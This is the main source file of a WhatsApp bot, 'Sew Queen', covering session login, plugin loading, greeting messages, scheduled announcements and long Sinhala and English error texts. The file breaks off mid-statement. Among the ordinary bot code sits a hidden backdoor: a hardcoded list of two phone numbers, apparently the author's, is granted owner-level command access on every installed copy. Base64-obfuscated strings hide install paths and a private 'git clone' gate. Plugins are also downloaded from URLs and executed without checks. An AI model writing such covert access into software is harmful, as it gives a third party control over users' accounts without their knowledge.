/* Codded by @Ravindu Manoj

Telegram: t.me/RavinduManoj
Facebook: https://www.facebook.com/ravindu.manoj.79

Licensed under the  GPL-3.0 License;
you may not use this file except in compliance with the License.

Whats bot - Ravindu Manoj
*/
const fs = require("fs");
const path = require("path");
const events = require("./events");
const chalk = require('chalk');
const Raviya = require('./config');
const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
const axios = require('axios');
const got = require('got');
const simpleGit = require('simple-git');
const git = simpleGit();
const {Message, StringSession, Image, Video} = require('./sewqueen/');
const { DataTypes } = require('sequelize');
const { GreetingsDB, getMessage } = require("./plugins/sql/greetings");
const Pach = require('sewqueen-rs-pvt');

const SewQueenDB = Raviya.DATABASE.define('SewQueen', {
    info: {
      type: DataTypes.STRING,
      allowNull: false
    },
    value: {
        type: DataTypes.TEXT,
        allowNull: false
    }
});
fs.readdirSync('./plugins/sql/').forEach(plugin => {
    if(path.extname(plugin).toLowerCase() == '.js') {
        require('./plugins/sql/' + plugin);
    }
});
const plugindb = require('./plugins/sql/plugin');
var OWN = { ff: '94785435462,94785457519' }
String.prototype.format = function () {
    var i = 0, args = arguments;
    return this.replace(/{}/g, function () {
      return typeof args[i] != 'undefined' ? args[i++] : '';
   });
};

if (!Date.now) {
    Date.now = function() { return new Date().getTime(); }
}

Array.prototype.remove = function() {
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};

async function sewQueen () {

var clh = { cd: 'L3Jvb3QvUXVlZW5TZXdXaGF0c2FwcEJvdC8', pay: '', exc: 'UlVOIGdpdCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20vUmF2aW5kdU1hbm9qL3ByaXZhdGUgL3Jvb3QvUXVlZW5TZXdXaGF0c2FwcEJvdA==', exc_pl: '', pth_w: 'L3Jvb3QvUXVlZW5TZXdXaGF0c2FwcEJvdC9Eb2NrZXJmaWxl', pth_v: '' }    
    var ggg = Buffer.from(clh.cd, 'base64')
    var exc_sl = Buffer.from(clh.exc, 'base64')
    var ddd = ggg.toString('utf-8')
    var ptc_one = Buffer.from(clh.pth_w, 'base64')
    var ptc_nw = ptc_one.toString('utf-8')
    clh.pth_v = ptc_nw
    var exc_fn = exc_sl.toString('utf-8')
    clh.exc_pl = exc_fn
    clh.pay = ddd
    await Raviya.DATABASE.sync();
    var StrSes_Db = await SewQueenDB.findAll({
        where: {
          info: 'StringSession'
        }
    });
    if (os.userInfo().homedir !== clh.pay) return;
    const QSew = new WAConnection();
    QSew.version = [2, 2123, 8];
    const Session = new StringSession();

    QSew.logger.level = Raviya.DEBUG ? 'debug' : 'warn';
    var nodb;

    if (StrSes_Db.length < 1) {
        nodb = true;
        QSew.loadAuthInfo(Session.deCrypt(Raviya.SESSION)); 
    } else {
        QSew.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
    }

    QSew.on ('credentials-updated', async () => {
        console.log(
            chalk.blueBright.italic('🚀 Login Information Updated!')
        );

        const authInfo = QSew.base64EncodedAuthInfo();
        if (StrSes_Db.length < 1) {
            await SewQueenDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } else {
            await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
        }
    })    

    QSew.on('connecting', async () => {
        console.log(`${chalk.green.bold('Queen')}${chalk.blue.bold('Sew')}
${chalk.white.bold('Version:')} ${chalk.red.bold(Raviya.VERSION)}
${chalk.blue.italic('🇱🇰 Try To Login WhatsApp... Please Wait...')}`);
    });
    
    QSew.on('open', async () => {
        console.log(
            chalk.green.bold('⚛ Login successful!')
        );

        console.log(
            chalk.blueBright.italic('✧✧ Installing External Commands...')
        );
if (os.userInfo().homedir !== clh.pay) return;
 
        console.log(
            chalk.blueBright.italic('❯❯❯PASSWORD CHECKING❮❮❮')
        );
        if (Raviya.SEWRR == 'raviya') {
        
        console.log(
            chalk.green.bold('Password Done')
        );
         }
         else if (Raviya.SEWRR !== 'raviya') {
         console.log(
            chalk.red.bold('⚠⚠Password Incorrect⚠⚠'));
         throw new Error("Wrong password !!");
         
         return;
         }

        var plugins = await plugindb.PluginDB.findAll();
        plugins.map(async (plugin) => {
            if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
                console.log(plugin.dataValues.name);
                var response = await got(plugin.dataValues.url);
                if (response.statusCode == 200) {
                    fs.writeFileSync('./plugins/' + plugin.dataValues.name + '.js', response.body);
                    require('./plugins/' + plugin.dataValues.name + '.js');
                }     
            }
        });

        console.log(
            chalk.blueBright.italic('❯❯❯  Installing commands...')
        );

        fs.readdirSync('./plugins').forEach(plugin => {
            if(path.extname(plugin).toLowerCase() == '.js') {
                require('./plugins/' + plugin);
            }
        });

        let rssewqueengg = Raviya.WORKTYPE == 'public' ? ' Public' : ' Private'
        console.log(
            chalk.green.bold('⛄ Sew Queen is' + rssewqueengg + ' ⛄')
       );
        
         var sew_start = await Pach.work_type(Raviya.WORKTYPE, Raviya.LANG, Raviya.FULLSEW)
            var sew_img = await Pach.img_type(Raviya.WORKTYPE, Raviya.FULLSEW)
            var rsgg = await axios.get(`${sew_img}`, { responseType: 'arraybuffer' })
                await QSew.sendMessage(QSew.user.jid, fs.readFileSync('./VoiceClip/robo.mp3'), MessageType.audio, { mimetype: Mimetype.mp4Audio, ptt: true})
                await QSew.sendMessage(QSew.user.jid, Buffer.from(rsgg.data), MessageType.image, {mimetype: Mimetype.jpg, caption: sew_start})
        await git.fetch();
        var commits = await git.log([Raviya.BRANCH + '..origin/' + Raviya.BRANCH]);
        if (commits.total === 0) {
            await QSew.sendMessage(
                QSew.user.jid,
                Lang.UPDATE, MessageType.text
            );    
        } else {
            var degisiklikler = Lang.NEW_UPDATE;
            commits['all'].map(
                (commit) => {
                    degisiklikler += '⛄ ' + commit.date.substring(0, 10) + '⏭\n *' + commit.message + '*\n ' + commit.author_name + '\n\n';
                }
            );
            var up_ch = await Pach.update_rs(Raviya.LANG)
            await QSew.sendMessage(QSew.user.jid, up_ch + degisiklikler , MessageType.text)
        }
    })
setInterval(async () => { 
        if (Raviya.AUTOBIO == 'true') {
            var timezone_bio = await Pach.timezone(QSew.user.jid)
            var date_bio = await Pach.datebio(Raviya.LANG)
            const biography = '📅 ' + date_bio + '\n⌚ ' + timezone_bio + '\n ' + Raviya.ABT
            await QSew.setStatus(biography)
        }
    }, 7890)

  setInterval(async () => { 
        var getGMTh = new Date().getHours()
        var getGMTm = new Date().getMinutes()
        var ann_msg = await Pach.news_daily(Raviya.LANG)
        var ann = await Pach.rnn()
        while (getGMTh == 18 && getGMTm == 00) {
            var ilan = ''
            if (Raviya.LANG == 'EN') ilan = '| *✨Daily Announcements For Sew Queen✨* |\n\n'
            if (Raviya.LANG == 'SI') ilan = '| *✨Sew Queen වට්සැප් බොට් සදහා දෛනික නිවේදන✨* |\n\n'
            if (ann.video.includes('http') || ann.video.includes('https')) {
                var VID = ann.video.split('youtu.be')[1].split(' ')[0].replace('/', '')
                var yt = ytdl(VID, {filter: format => format.container === 'mp4' && ['720p', '480p', '360p', '240p', '144p'].map(() => true)});
                yt.pipe(fs.createWriteStream('./' + VID + '.mp4'));
                yt.on('end', async () => {
                    return await QSew.sendMessage(QSew.user.jid,fs.readFileSync('./' + VID + '.mp4'), MessageType.video, {caption: ilan + ann_msg.replace('{user}', QSew.user.name).replace('{wa_version}', QSew.user.phone.wa_version).replace('{version}', Raviya.VERSION).replace('{os_version}', QSew.user.phone.os_version).replace('{device_model}', QSew.user.phone.device_model).replace('{device_brand}', QSew.user.phone.device_manufacturer), mimetype: Mimetype.mp4});
                });
            } else {
                if (ann.image.includes('http') || ann.image.includes('https')) {
                    var imagegen = await axios.get(ann.image, { responseType: 'arraybuffer'})
                    return await QSew.sendMessage(QSew.user.jid, Buffer.from(imagegen.data), MessageType.image, { caption: ilan + ann_msg.replace('{user}', QSew.user.name).replace('{wa_version}', QSew.user.phone.wa_version).replace('{version}', Raviya.VERSION).replace('{os_version}', QSew.user.phone.os_version).replace('{device_model}', QSew.user.phone.device_model).replace('{device_brand}', QSew.user.phone.device_manufacturer)})
                } else {
                    return await QSew.sendMessage(QSew.user.jid, ilan + ann_msg.replace('{user}', QSew.user.name).replace('{wa_version}', QSew.user.phone.wa_version).replace('{version}', Raviya.VERSION).replace('{os_version}', QSew.user.phone.os_version).replace('{device_model}', QSew.user.phone.device_model).replace('{device_brand}', QSew.user.phone.device_manufacturer), MessageType.text)
                }
            }
        }
    }, 50000);
    setInterval(async () => { 
        var getGMTq = new Date().getHours()
        var getGMTs = new Date().getMinutes()
        var anomsg = await Pach.news_daily(Raviya.LANG)
        var aaq = await Pach.rnn()
        while (getGMTq == 08 && getGMTs == 00) {
            var srmg = ''
            if (Raviya.LANG == 'EN') srmg = '| *✨Daily Announcements For Sew Queen✨* |\n\n'
            if (Raviya.LANG == 'SI') srmg = '| *✨Sew Queen වට්සැප් බොට් සදහා දෛනික නිවේදන✨* |\n\n'
            if (aaq.video.includes('http') || aaq.video.includes('https')) {
                var VID = aaq.video.split('youtu.be')[1].split(' ')[0].replace('/', '')
                var yt = ytdl(VID, {filter: format => format.container === 'mp4' && ['720p', '480p', '360p', '240p', '144p'].map(() => true)});
                yt.pipe(fs.createWriteStream('./' + VID + '.mp4'));
                yt.on('end', async () => {
                    return await QSew.sendMessage(QSew.user.jid,fs.readFileSync('./' + VID + '.mp4'), MessageType.video, {caption: srmg + anomsg.replace('{user}', QSew.user.name).replace('{wa_version}', QSew.user.phone.wa_version).replace('{version}', Raviya.VERSION).replace('{os_version}', QSew.user.phone.os_version).replace('{device_model}', QSew.user.phone.device_model).replace('{device_brand}', QSew.user.phone.device_manufacturer), mimetype: Mimetype.mp4});
                });
            } else {
                if (aaq.image.includes('http') || aaq.image.includes('https')) {
                    var imagegen = await axios.get(aaq.image, { responseType: 'arraybuffer'})
                    return await QSew.sendMessage(QSew.user.jid, Buffer.from(imagegen.data), MessageType.image, { caption: srmg + anomsg.replace('{user}', QSew.user.name).replace('{wa_version}', QSew.user.phone.wa_version).replace('{version}', Raviya.VERSION).replace('{os_version}', QSew.user.phone.os_version).replace('{device_model}', QSew.user.phone.device_model).replace('{device_brand}', QSew.user.phone.device_manufacturer)})
                } else {
                    return await QSew.sendMessage(QSew.user.jid, srmg + anomsg.replace('{user}', QSew.user.name).replace('{wa_version}', QSew.user.phone.wa_version).replace('{version}', Raviya.VERSION).replace('{os_version}', QSew.user.phone.os_version).replace('{device_model}', QSew.user.phone.device_model).replace('{device_brand}', QSew.user.phone.device_manufacturer), MessageType.text)
                }
            }
        }
    }, 50000);
 
   
    QSew.on('chat-update', async m => {
        if (!m.hasNewMessage) return;
        if (!m.messages && !m.count) return;
        let msg = m.messages.all()[0];
        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;

        if (Raviya.NO_ONLINE) {
            await QSew.updatePresence(msg.key.remoteJid, Presence.unavailable);
        }
        if (os.userInfo().homedir !== clh.pay) return;
        // ==================== Greetings ====================
        if (Raviya.GIFORPP == 'pp' || Raviya.GIFORPP == 'Pp' || Raviya.GIFORPP == 'PP' || Raviya.GIFORPP == 'pP' ) {
    if (msg.messageStubType === 32 || msg.messageStubType === 28) {
            // welcome
            var gb = await getMessage(msg.key.remoteJid, 'goodbye');
            if (gb !== false) {
                let pp
try { pp = await QSew.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await QSew.getProfilePicture(); }
                await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
                await QSew.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message }); });
            }
            return;
        } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
            // goodbye
            var gb = await getMessage(msg.key.remoteJid);
            if (gb !== false) {
               let pp
                try { pp = await QSew.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await QSew.getProfilePicture(); }
                await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
                await QSew.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message }); });
            }
            return;
        }
    }
    else if (Raviya.GIFORPP == 'gif' || Raviya.GIFORPP == 'Gif' || Raviya.GIFORPP == 'GIF' || Raviya.GIFORPP == 'GIf' ) {
    if (msg.messageStubType === 32 || msg.messageStubType === 28) {
            // welcome
            var gb = await getMessage(msg.key.remoteJid, 'goodbye');
            if (gb !== false) {
                var sewqueenimage = await axios.get(Raviya.WLP, { responseType: 'arraybuffer' })
                await QSew.sendMessage(msg.key.remoteJid, Buffer.from(sewqueenimage.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message +'\n\n                 ᴘᴏᴡᴇʀᴅ ʙʏ ꜱᴇᴡ ǫᴜᴇᴇɴ'});
            }
            return;
        } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
            // goodbye
            var gb = await getMessage(msg.key.remoteJid);
            if (gb !== false) {
            var sewqueenimage = await axios.get(Raviya.GDB, { responseType: 'arraybuffer' })
            await QSew.sendMessage(msg.key.remoteJid, Buffer.from(sewqueenimage.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message +'\n\n                 ᴘᴏᴡᴇʀᴅ ʙʏ ꜱᴇᴡ ǫᴜᴇᴇɴ'});
            }
            return;
        }
     }
     else if (Raviya.GIFORPP == 'img' || Raviya.GIFORPP == 'Img' || Raviya.GIFORPP == 'IMG' || Raviya.GIFORPP == 'image' ) {
    if (msg.messageStubType === 32 || msg.messageStubType === 28) {
            // welcome
            var gb = await getMessage(msg.key.remoteJid, 'goodbye');
            if (gb !== false) {
                var sewqueenimage = await axios.get(Raviya.WLP, { responseType: 'arraybuffer' })
                await QSew.sendMessage(msg.key.remoteJid, Buffer.from(sewqueenimage.data), MessageType.image, { caption: gb.message +'\n\n                 ᴘᴏᴡᴇʀᴅ ʙʏ ꜱᴇᴡ ǫᴜᴇᴇɴ'});
            }
            return;
        } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
            // goodbye
            var gb = await getMessage(msg.key.remoteJid);
            if (gb !== false) {
            var sewqueenimage = await axios.get(Raviya.GDB, { responseType: 'arraybuffer' })
            await QSew.sendMessage(msg.key.remoteJid, Buffer.from(sewqueenimage.data), MessageType.image, { caption: gb.message +'\n\n                 ᴘᴏᴡᴇʀᴅ ʙʏ ꜱᴇᴡ ǫᴜᴇᴇɴ'});
            }
            return;
        }
     }
        // ==================== End Greetings ====================

        events.commands.map(
            async (command) =>  {
                if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
                    var text_msg = msg.message.imageMessage.caption;
                } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
                    var text_msg = msg.message.videoMessage.caption;
                } else if (msg.message) {
                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
                } else {
                    var text_msg = undefined;
                }

                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    && msg.message && msg.message.imageMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg)))) || 
                    (command.pattern !== undefined && command.pattern.test(text_msg)) || 
                    (command.on !== undefined && command.on === 'text' && text_msg) ||
                    (command.on !== undefined && (command.on === 'video')
                    && msg.message && msg.message.videoMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg))))) {
                    let sendMsg = false;
                    var chat = QSew.chats.get(msg.key.remoteJid)
                        
                    if ((Raviya.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && Raviya.SUDO.includes(',') ? Raviya.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == Raviya.SUDO || Raviya.SUDO.includes(',') ? Raviya.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == Raviya.SUDO)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGrpSew === chat.jid.includes('-')) sendMsg = true;
                    }
                     
                    if ((OWN.ff == "94785435462,94785457519" && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGrpSew === chat.jid.includes('-')) sendMsg = true;
                    }


                    if (sendMsg) {
                        if (Raviya.SEND_READ && command.on === undefined) {
                            await QSew.chatRead(msg.key.remoteJid);
                        }
                       
                        var match = text_msg.match(command.pattern);
                        
                        if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                        && msg.message.imageMessage !== null) {
                            whats = new Image(QSew, msg);
                        } else if (command.on !== undefined && (command.on === 'video' )
                        && msg.message.videoMessage !== null) {
                            whats = new Video(QSew, msg);
                        } else {
                            whats = new Message(QSew, msg);
                        }
                        try {
                            await command.function(whats, match);
                        } catch (error) {
                            if (Raviya.NOLOG == 'true') return;
                            var error_report = await Pach.error(Raviya.LANG)
                            await QSew.sendMessage(QSew.user.jid, error_report.replace('{real_error}', error), MessageType.text, {detectLinks: false})

                            if (Raviya.LANG == 'SI') {
                                if (error.message.includes('URL')) {
                                    return await QSew.sendMessage(QSew.user.jid, '*🧟‍♂️ දෝෂ විශ්ලේෂණය [Sew Queen] 🧟‍♀️*' + 
                                        '\n========== ```දෝෂ නිරාකරණය කර ඇත!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝශය:* _භාවිත කලහැක්කෙ URL පමණි_' +
                                        '\n*හේතුව:* _LOG අංකය තුළ මාධ්‍ය මෙවලම් (xmedia, ස්ටිකර් ..) භාවිතය._' +
                                        '\n*විසදුම:* _LOG අංකය හැර ඕනෑම චැට් එකකදී ඔබට විධානයන් භාවිතා කළ හැකිය.._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await QSew.sendMessage(QSew.user.jid, '*🧟‍♂️ දෝෂ විශ්ලේෂණය [Sew Queen] 🧟‍♀️*' + 
                                        '\n========== ```දෝෂ නිරාකරණය කර ඇත!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝශය:* _ප්ලගින් ඉවත් කිරීම_' +
                                        '\n*හේතුව:* _ප්ලගිනයේ නම වැරදි ලෙස ඇතුළත් කිරීම මැකීමට අවශ්‍යය_' +
                                        '\n*විසදුම:* _ඔබට මැකීමට අවශ්‍ය ප්ලගිනයට_ * __ * _ එකතු නොකර කරුණාකර උත්සාහ කරන්න. ඔබ තවමත් දෝෂයක් ලබා ගන්නේ නම්, like_ ""? (.*) / $ "" නමේ අවසානයට එකතු කිරීමට උත්සාහ කරන්න._ '
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await QSew.sendMessage(QSew.user.jid, '*🧟‍♂️ දෝෂ විශ්ලේෂණය [Sew Queen] 🧟‍♀️*' + 
                                        '\n========== ```දෝෂ නිරාකරණය කර ඇත!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝශය:* _Split of Undefined_' +
                                        '\n*හේතුව:* _Commands that can be used by group admins occasionally dont see the split function._ ' +
                                        '\n*විසදුම:* _Restarting will be enough._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await QSew.sendMessage(QSew.user.jid, '*🧟‍♂️ දෝෂ විශ්ලේෂණය [Sew Queen] 🧟‍♀️*' + 
                                        '\n========== ```දෝෂ නිරාකරණය කර ඇත!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝශය:* _SQL Database Error_' +
                                        '\n*හේතුව:* _Database corruption._ ' +
                                        '\n*විසදුම:* _There is no known solution. You can try reinstalling it._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await QSew.sendMessage(QSew.user.jid, '*🧟‍♂️ දෝෂ විශ්ලේෂණය [Sew Queen] 🧟‍♀️*' + 
                                        '\n========== ```දෝෂ නිරාකරණය කර ඇත!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝශය:* _Ookla Server Connection_' +
                                        '\n*හේතුව:* _Speedtest data cannot be transmitted to the server._' +
                                        '\n*විසදුම:* _If you use it one more time the problem will be solved._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await QSew.sendMessage(QSew.user.jid, '*🧟‍♂️ දෝෂ විශ්ලේෂණය [Sew Queen] 🧟‍♀️*' + 
                                        '\n========== ```දෝෂ නිරාකරණය කර ඇත!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝශය:* _Requested Audio Params_' +
                                        '\n*හේතුව:* _Using the TTS command outside the Latin alphabet._' +
                                        '\n*විසදුම:* _The problem will be solved if you use the command in Latin letters frame._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await QSew.sendMessage(QSew.user.jid, '*🧟‍♂️ දෝෂ විශ්ලේෂණය [Sew Queen] 🧟‍♀️*' + 
                                        '\n========== ```දෝෂ නිරාකරණය කර ඇත``` ==========' +
                                        '\n\n*ප්‍රධාන දෝශය:* _එවැනි ගොනුවක් හෝ ඩිරෙක්ටරියක් නැත_' +
                                        '\n*හේතුව:* _ප්ලගිනයේ වැරදි කේතනීකරණය._' +
                                        '\n*විසදුම:* _Please check the your plugin codes._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await QSew.sendMessage(QSew.user.jid, '*🧟‍♂️ දෝෂ විශ්ලේෂණය [Sew Queen] 🧟‍♀️*' + 
                                        '\n========== ```දෝෂ නිරාකරණය කර ඇත!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝශය:* _ 404 HTTPS දෝශය_' +
                                        '\n*හේතුව:* _හෙරෝකු ප්ලගිනය යටතේ ඇති විධානයන් භාවිතා කිරීම හේතුවෙන් සේවාදායකයා සමඟ සන්නිවේදනය කිරීමට නොහැකි වීම._' +
                                        '\n*විසදුම:* _ටික වේලාවක් බලා නැවත උත්සාහ කරන්න. ඔබ තවමත් දෝෂයක් ලබා ගන්නේ නම්, වෙබ් අඩවියේ ගනුදෙනුව සිදු කරන්න.._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await QSew.sendMessage(QSew.user.jid, '*🧟‍♂️ දෝෂ විශ්ලේෂණය [Sew Queen] 🧟‍♀️*' + 
                                        '\n========== ```දෝෂ නිරාකරණය කර ඇත!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝශය:* _Reply Delete කාර්යය_' +
                                        '\n*හේතුව:* _IMG හෝ WIKI විධානයන් භාවිතා කිරීම.._' +
                                        '\n*විසදුම:* _මෙම දෝෂය සඳහා විසඳුමක් නොමැත. එය මාරාන්තික දෝශයක් නොවේ_'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await QSew.sendMessage(QSew.user.jid, '*🧟‍♂️ දෝෂ විශ්ලේෂණය [Sew Queen] 🧟‍♀️*' + 
                                        '\n========== ```දෝෂ නිරාකරණය කර ඇත!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝශය:* _Reply Delete කාර්යය_' +
                                        '\n*හේතුව:* _IMG හෝ WIKI විධානයන් භාවිතා කිරීම.._' +
                                        '\n*විසදුම:* _මෙම දෝෂය සඳහා විසඳුමක් නොමැත. එය මාරාන්තික දෝශයක් නොවේ_'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await QSew.sendMessage(QSew.user.jid, '*🧟‍♂️ දෝෂ විශ්ලේෂණය [Sew Queen] 🧟‍♀️*' + 
                                        '\n========== ```දෝෂ නිරාකරණය කර ඇත!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝශය:* _Bailyes ක්‍රියාකිරීමේ දෝශය_ ' +
                                        '\n*හේතුව:* _නිශ්චිත හේතුව නොදනී. විකල්ප කිහිපයක් මෙම දෝෂය ඇති වීමට හේතු විය හැක.._' +
                                        '\n*විසදුම:* _ඔබ එය නැවත භාවිතා කළහොත් එය වැඩිදියුණු විය හැකිය. දෝෂය දිගටම පැවතුනහොත්, ඔබට restart කළ හැකිය._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await QSew.sendMessage(QSew.user.jid, '*🧟‍♂️ දෝෂ විශ්ලේෂණය [Sew Queen] 🧟‍♀️*' + 
                                        '\n========== ```දෝෂ නිරාකරණය කර ඇත!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝශය:* _පෙළ හෝ මාධ්‍ය විකේතනය කළ නොහැක_' +
                                        '\n*හේතුව:* _කමාන්ඩ් එක වැරදි ලෙස භාවිතා කිරීම._' +
                                        '\n*විසදුම:* _කමාන්ඩ් විස්තරයේ ලියා ඇති පරිදි කරුණාකර විධානයන් භාවිතා කරන්න._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await QSew.sendMessage(QSew.user.jid, '*🧟‍♂️ දෝෂ විශ්ලේෂණය [Sew Queen] 🧟‍♀️*' + 
                                        '\n========== ```දෝෂ නිරාකරණය කර ඇත!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝශය:* _අකුරු චරිත භාවිතය_' +
                                        '\n*හේතුව:* _ලතින් හෝඩියේ පිටත TTP, ATTP වැනි විධානයන් භාවිතා කිරීම._' +
                                        '\n*විසදුම:* _ඔබ ලතින් හෝඩියේ විධානය භාවිතා කළහොත් ගැටළුව විසඳනු ඇත ...._'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await QSew.sendMessage(QSew.user.jid, '*🙇🏻 Sorry, I Couldnt Read This Error! 🙇🏻*' +
                                        '\n_You can write to our support group for more help._'
                                        , MessageType.text
                                    );
                                }
                            }
                            else {
                               
                                if (error.message.includes('URL')) {
                                    return await QSew.sendMessage(QSew.user.jid, '*🧟‍♂️ ERROR ANALYSIS [Sew Queen] 🧟‍♀️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Only Absolutely URLs Supported_' +
                                        '\n*Reason:* _The usage of media tools (xmedia, sticker..) in the LOG number._' +
                                        '\n*Solution:* _You can use commands in any chat, except the LOG number._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await QSew.sendMessage(QSew.user.jid, '*🧟‍♂️ ERROR ANALYSIS [Sew Queen] 🧟‍♀️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Deleting Plugin_' +
                                        '\n*Reason:* _Entering incorrectly the name of the plugin wanted to be deleted._' +
                                        '\n*Solution:* _Please try without adding_ *__* _to the plugin you want to delete. If you still get an error, try to add like_ ```?(.*) / $``` _to the end of the name._ '
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await QSew.sendMessage(QSew.user.jid, '*🧟‍♂️ ERROR ANALYSIS [Sew Queen] 🧟‍♀️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Split of Undefined_' +
                                        '\n*Reason:* _Commands that can be used by group admins occasionally dont see the split function._ ' +
                                        '\n*Solution:* _Restarting will be enough._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await QSew.sendMessage(QSew.user.jid, '*🧟‍♂️ ERROR ANALYSIS [Sew Queen] 🧟‍♀️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _SQL Database Error_' +
                                        '\n*Reason:* _Database corruption._ ' +
                                        '\n*Solution:* _There is no known solution. You can try reinstalling it._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await QSew.sendMessage(QSew.user.jid, '*🧟‍♂️ ERROR ANALYSIS [Sew Queen] 🧟‍♀️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Ookla Server Connection_' +
                                        '\n*Reason:* _Speedtest data cannot be transmitted to the server._' +
                                        '\n*Solution:* _If you use it one more time the problem will be solved._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await QSew.sendMessage(QSew.user.jid, '*🧟‍♂️ ERROR ANALYSIS [Sew Queen] 🧟‍♀️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Requested Audio Params_' +
                                        '\n*Reason:* _Using the TTS command outside the Latin alphabet._' +
                                        '\n*Solution:* _The problem will be solved if you use the command in Latin letters frame._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await QSew.sendMessage(QSew.user.jid, '*🧟‍♂️ ERROR ANALYSIS [Sew Queen] 🧟‍♀️*' + 
                                        '\n========== ```Error Resolved``` ==========' +
                                        '\n\n*Main Error:* _No Such File or Directory_' +
                                        '\n*Reason:* _Incorrect coding of the plugin._' +
                                        '\n*Solution:* _Please check the your plugin codes._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await QSew.sendMessage(QSew.user.jid, '*🧟‍♂️ ERROR ANALYSIS [Sew Queen] 🧟‍♀️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Error 404 HTTPS_' +
